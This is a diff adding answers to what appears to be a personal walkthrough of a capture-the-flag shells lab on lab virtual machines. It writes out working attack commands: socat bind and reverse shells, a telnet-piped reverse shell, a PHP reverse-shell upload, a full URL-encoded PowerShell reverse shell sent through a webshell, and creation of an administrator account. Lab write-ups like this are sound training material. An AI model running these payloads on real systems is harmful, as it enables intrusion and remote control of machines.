@@ -1002,31 +1002,120 @@ ls
 ---
 Step 1 - Use socat bind shells listener command in Task 6 on ATTACKer Terminal
 ```
-socat TCP-L:443 EXEC : EXEC:"bash -li"
+socat TCP-L:1112 -
 ```
 Step 2 - Use socat bind shells command on the Attacker Terminal 
 ```
-socat TCP:10.10.8.56:1023 -
+socat TCP:10.10.8.56:1112 -
 ```
+![img](/assets/img/wts28.png) 
 
+---
 
 
 
 
 5. Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyse them and see why they work.
 
+Example using Telnet:
+
+Step 1: Open a terminal
+```
+nc -vnp 8080
+```
+
+Step 2: Open another terminal
+```
+nc -vnp 8081
+```
+
+Step 3: Open the third terminal and SSH to the Target to setup reverse shell
+```
+telnet 10.10.63.87 8080 | /bin/bash | telnet 10.10.63.87 8081
+```
+
+---
+
 
 6. Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?
+
+Step 1 - open up the browser and enter the Ip of the target 
+Step 2 - copy the reverse shell php file to Desktop
+Step 3 - Edit the IP address of the php 
+Step 4 - Upload to the browser
+Step 5 - nc -lvnp 1234 on the terminal and listening to the port 1234
+Step 6 - Click on the php file from the browser "/uploads" and run the reverse shell php file
+
+Note: the reverse shell is not working on Windows machine.
+![img](/assets/img/wts29.png) 
 
 
 7. Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
 
+Step 1 - Create a listener via the terminal 
+```
+nc -lvnp 1234
+```
+Step 2 
+- Using the same browser and type the commands on the address field
+```
+http://10.10.108.96/uploads/
+
+```
+- Ref: Task 11 
+```
+php-reverse-shell.php?cmd=
+```
+- Copy and paste the PowerShell and change the ```<IP>``` and ```<PORT>```
+```
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.106.105%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
+
+- The new url on the 
+```
+http://10.10.108.96/uploads/php-reverse-shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.106.105%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+
+```
+
+
 
 8. The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
+
+Step 1 - use the command to RDP 
+To login using RDP:
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.199.85 /u:Administrator /p:'TryH4ckM3!'
+```
+Step 2 - use Task 12 to create Admin user (1:33:25) on cmd prompt in the Windows machine
+```
+net user <username> <password> /add
+net localgroup administrators <username /add>
+```
+Step 3 - Testing - using the newly created Admin user with Step 1 command to check 
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.199.85 /u:ant /p:'ant'
+```
+![img](/assets/img/wts30.png)
+
+---
+
 
 
 9. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
 
+Step 1 - using Task 6 command to create a listener
+```
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```
+
+Step 2 - use the following command on the TARGET machine to connect to the listener 
+```
+socat TCP:<Target-IP>:<Target-PORT> -
+```
+
+
+
+--- 
 
 10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
 
